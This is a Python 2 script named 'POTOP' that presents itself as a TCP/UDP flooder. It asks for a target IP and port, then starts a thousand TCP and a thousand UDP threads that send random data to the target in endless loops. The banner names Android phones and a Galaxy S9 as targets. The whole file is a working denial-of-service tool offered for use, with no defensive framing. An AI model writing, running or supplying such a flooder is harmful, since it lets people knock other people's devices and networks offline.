import socket
import random
from threading import Thread
import threading
import bcolors
import pyfiglet

ascii_banner = pyfiglet.figlet_format("POTOP")
print(bcolors.BOLD + bcolors.HEADER + ascii_banner)
print("TCP/UDP Flooder made by: xxSlothAIxx")
print("=======================================================")
print(bcolors.BOLD + "PORT OPTIONS")
print("Port 6 for Android devices")
print("Port 80 for http on local network")
print("Port 0-65535 for galaxy s9")
print("=======================================================")
print("\n")

data = random._urandom(16)
bytes = random._urandom(1024)

ip = raw_input("Enter your ip: ")
port = raw_input("Enter PORT:")

socket_threads = []
udp_threads = []

class SocketThread(Thread):

	def __init__(self, ip, port):
		Thread.__init__(self)
		self.ip = ip
		self.port = port

	def run(self):
		while True:
			try:
				server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				server.connect((ip, int(port)))
				for x in range(0, 100):
					server.send(data)
				print('[*] TCP TCP TCP CONNECTED %s' % self.ip)
			except:
				server.close()
				print('[*] Error ')

class UDPThread(Thread):

	def __init__(self, ip, port):
		Thread.__init__(self)
		self.ip = ip
		self.port = port

	def run(self):
		while True:
			udpclient = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			try:
				for x in range(0, 1000):
					udpclient.sendto(bytes, (ip, int(port)))
				print('UDP CONNECTED:  %s' % self.ip)
			except:
				print('[*] Error ')

def thread_socket():
	for _ in range(0, 1000):
		sthread = SocketThread(ip, port)
		sthread.start()
		socket_threads.append(sthread)

	for socket_thread in socket_threads:
		socket_thread.join()

def thread_udp():
	for _ in range(0, 1000):
		uthread = UDPThread(ip, port)
		uthread.start()
		udp_threads.append(uthread)

	for udp_thread in udp_threads:
		udp_thread.join()


thread1 = threading.Thread(target=thread_socket)
thread2 = threading.Thread(target=thread_udp)
thread1.start()
thread2.start()

thread1.join()
thread2.join()